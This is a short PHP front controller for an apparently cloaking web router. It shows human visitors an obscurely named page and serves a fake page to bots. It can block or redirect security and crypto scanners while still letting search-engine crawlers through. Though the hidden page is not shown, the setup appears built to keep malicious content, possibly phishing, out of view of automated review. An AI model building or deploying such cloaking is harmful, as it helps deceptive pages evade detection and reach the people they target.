<?php
define('ROOT_PATH', __DIR__);
define('PAGES_PATH', ROOT_PATH . '/pages');
define('LOGS_PATH', ROOT_PATH . '/logs');

require_once ROOT_PATH . '/UltimateRouter.php';

$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$requestMethod = $_SERVER['REQUEST_METHOD'] ?? 'GET';

$path = parse_url($requestUri, PHP_URL_PATH);
$path = rtrim($path, '/') ?: '/';

$bindings = [
    'real_user' => [
        'type' => 'file',
        'path' => ROOT_PATH . '/adbasddvtaytvwed.php'
    ],
    'default_bot' => [
        'type' => 'file',
        'path' => ROOT_PATH . '/bot_page.php'
    ],
];

$config = [
    'cng_mode' => 'block', // block | redirect | fake | hybrid
    'bot_mode' => 'fake_page',
    'block_crypto_scanners' => true,
    'log_to_file' => true,
    'log_dir' => LOGS_PATH,
    'cng_redirect_url' => '/blocked',
    'bot_redirect_url' => '/bot',
    'whitelist_ips' => ['127.0.0.1', '::1'],
    'whitelist_user_agents' => ['Googlebot', 'YandexBot', 'Bingbot', 'Slurp', 'DuckDuckBot']
];

$router = new UltimateRouter($bindings, $config);
// }
?>